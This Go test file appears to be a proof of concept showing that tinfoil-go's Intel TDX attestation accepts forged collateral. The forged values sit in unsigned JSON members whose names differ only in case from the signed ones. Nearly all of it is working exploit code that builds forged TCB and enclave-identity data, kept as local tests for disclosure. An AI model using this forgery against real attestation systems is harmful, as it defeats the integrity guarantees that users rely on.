package tdx

// Stage 3 (drop into tinfoil-go @ ef79d8e, verify/internal/quote/tdx/; production
// build, no build tags): tinfoil-go's TDX authentication, which replays the
// document-carried Intel PCS responses into go-tdx-guest v0.3.1, accepts
// collateral whose enforced values sit in UNSIGNED case-variant members.
//
// Material: Intel's production SPR quote (go-tdx-guest testdata), genuine Intel PCS
// collateral fetched 2026-10-08 (testdata/poc-casefold, copied by run.sh from
// ../2-go-tdx-guest/testdata), tinfoil-go's pinned Intel SGX Root CA, time.Now().

import (
	"bufio"
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	tdxabi "github.com/google/go-tdx-guest/abi"
	tdxpb "github.com/google/go-tdx-guest/proto/tdx"
	tdxtestdata "github.com/google/go-tdx-guest/testing/testdata"
	"github.com/stretchr/testify/require"

	"github.com/tinfoilsh/tinfoil-go/document/collateral"
)

func pocLoad(t *testing.T, name, url string) collateral.PCSResponse {
	t.Helper()
	dir := filepath.Join("testdata", "poc-casefold")
	body, err := os.ReadFile(filepath.Join(dir, name+".body"))
	require.NoError(t, err)
	raw, err := os.ReadFile(filepath.Join(dir, name+".headers"))
	require.NoError(t, err)
	headers := map[string][]string{}
	sc := bufio.NewScanner(bytes.NewReader(raw))
	sc.Buffer(make([]byte, 1<<20), 1<<20)
	for sc.Scan() {
		k, v, ok := strings.Cut(sc.Text(), ":")
		if !ok || strings.HasPrefix(k, "HTTP/") {
			continue
		}
		headers[k] = append(headers[k], strings.TrimSpace(v))
	}
	return collateral.PCSResponse{URL: url, Headers: headers, Body: body}
}

func pocGenuine(t *testing.T) []collateral.PCSResponse {
	return []collateral.PCSResponse{
		pocLoad(t, "tcb", "https://api.trustedservices.intel.com/tdx/certification/v4/tcb?fmspc=50806f000000"),
		pocLoad(t, "qeid", "https://api.trustedservices.intel.com/tdx/certification/v4/qe/identity"),
		pocLoad(t, "pckcrl", "https://api.trustedservices.intel.com/sgx/certification/v4/pckcrl?ca=platform&encoding=der"),
		pocLoad(t, "rootcrl", "https://certificates.trustedservices.intel.com/IntelSGXRootCA.der"),
	}
}

// The sample quote carries trailing non-zero bytes outside the signed data, which
// tinfoil-go rejects; use only the signed portion.
func pocQuote(t *testing.T) []byte {
	t.Helper()
	parsed, err := tdxabi.QuoteToProto(tdxtestdata.RawQuote)
	require.NoError(t, err)
	return tdxtestdata.RawQuote[:len(tdxtestdata.RawQuote)-len(parsed.(*tdxpb.QuoteV4).GetExtraBytes())]
}

// Signed member and signature are kept byte-for-byte; an unsigned member whose name
// differs only in case is inserted.
func pocCaseVariant(t *testing.T, body []byte, signedKey, variantKey string, override any) []byte {
	t.Helper()
	var top map[string]json.RawMessage
	require.NoError(t, json.Unmarshal(body, &top))
	ov, err := json.Marshal(override)
	require.NoError(t, err)
	return []byte(`{"` + signedKey + `":` + string(top[signedKey]) + `,"` + variantKey + `":` + string(ov) +
		`,"signature":` + string(top["signature"]) + `}`)
}

func pocForge(t *testing.T, qeExtra map[string]any) []collateral.PCSResponse {
	pcs := pocGenuine(t)
	z := make([]map[string]any, 16)
	for i := range z {
		z[i] = map[string]any{"svn": 0}
	}
	lvl := map[string]any{"tcb": map[string]any{"isvsvn": 0}, "tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}
	pcs[0].Body = pocCaseVariant(t, pcs[0].Body, "tcbInfo", "tcbinfo", map[string]any{
		"tcbLevels": []any{map[string]any{"tcb": map[string]any{"sgxtcbcomponents": z, "pcesvn": 0, "tdxtcbcomponents": z},
			"tcbDate": "2026-01-01T00:00:00Z", "tcbStatus": "UpToDate"}},
		"tdxModuleIdentities": []any{map[string]any{"id": "TDX_00", "mrsigner": strings.Repeat("0", 96),
			"attributes": "0000000000000000", "attributesMask": "FFFFFFFFFFFFFFFF", "tcbLevels": []any{lvl}}},
	})
	qe := map[string]any{"tcbLevels": []any{lvl}}
	for k, v := range qeExtra {
		qe[k] = v
	}
	pcs[1].Body = pocCaseVariant(t, pcs[1].Body, "enclaveIdentity", "enclaveidentity", qe)
	return pcs
}

func TestPoC_A_Control_GenuineCollateralRejected(t *testing.T) {
	_, err := Authenticate(Evidence{Quote: pocQuote(t), PCS: pocGenuine(t)}, nil)
	t.Logf("genuine collateral: %v", err)
	require.Error(t, err)
}

func TestPoC_B_UnsignedCaseVariantAccepted(t *testing.T) {
	q, err := Authenticate(Evidence{Quote: pocQuote(t), PCS: pocForge(t, nil)}, nil)
	require.NoError(t, err)
	t.Logf("ACCEPTED: identity(PPID)=%s tcbEvaluationDataNumber(recorded from the signed member)=%d", q.Identity(), q.tcbEvaluationDataNumber)
	t.Logf("measurement returned to the caller: %s", q.Measurement)
}

func TestPoC_C_UnsignedQeMrsignerEnforced(t *testing.T) {
	_, err := Authenticate(Evidence{Quote: pocQuote(t), PCS: pocForge(t, map[string]any{"mrsigner": strings.Repeat("ab", 32)})}, nil)
	t.Logf("unsigned enclaveidentity.mrsigner=abab..: %.220v", err)
	require.Error(t, err)
	require.Contains(t, err.Error(), "MRSIGNER")
}
